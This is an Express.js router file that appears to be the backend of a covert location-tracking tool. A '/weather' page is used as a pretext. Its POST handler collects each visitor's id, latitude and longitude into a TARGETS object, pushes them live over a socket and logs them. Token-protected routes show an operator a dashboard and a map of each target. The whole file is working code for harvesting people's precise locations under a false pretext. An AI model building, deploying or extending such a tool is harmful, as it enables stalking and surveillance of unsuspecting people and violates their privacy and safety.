const express = require("express")
const router = express.Router()
const config = require("./config")


const TARGETS = {}

// login page 
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }

    res.redirect("/")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    if (TARGETS[id] == null) {
        IO.emit("user-connected", id)
    }

    TARGETS[id] = [lat, lng]
    IO.emit("map-data", { id, lat, lng })
    res.send("OK")
    console.log(`> ${id} - ${TARGETS[id]}`)
})

// token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query

    res.render("map", {
        data: TARGETS[id]
    })
})


module.exports = router